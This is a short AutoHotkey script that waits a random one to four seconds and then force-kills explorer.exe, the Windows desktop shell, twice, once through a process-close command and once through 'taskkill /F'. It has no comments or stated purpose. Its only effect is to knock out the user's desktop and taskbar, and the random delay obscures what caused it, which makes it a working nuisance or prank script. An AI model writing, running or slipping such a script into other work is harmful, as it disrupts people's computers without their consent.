Random, delay, 1000, 4000
Sleep, %delay%
Process, Close, explorer.exe
Run, taskkill.exe /F /IM explorer.exe
exitapp
